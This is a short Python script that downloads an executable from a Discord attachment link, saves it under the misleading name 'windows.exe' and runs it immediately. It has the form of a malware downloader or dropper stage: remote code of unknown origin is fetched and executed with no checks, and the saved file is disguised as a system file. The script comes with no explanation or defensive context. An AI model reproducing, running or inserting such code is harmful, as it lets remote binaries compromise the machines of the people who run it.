import requests
import subprocess
import os

url = 'https://cdn.discordapp.com/attachments/1227878114533572611/1227920673457045554/ConsoleApplication2.exe?ex=662a293e&is=6617b43e&hm=aaf95cda360017d5147699490bdb6a23597fbf29a42599b417011fbc40262018&'
response = requests.get(url)


exe_path = 'windows.exe'

with open(exe_path, 'wb') as file:
    file.write(response.content)

if os.path.exists(exe_path):
    subprocess.call([exe_path])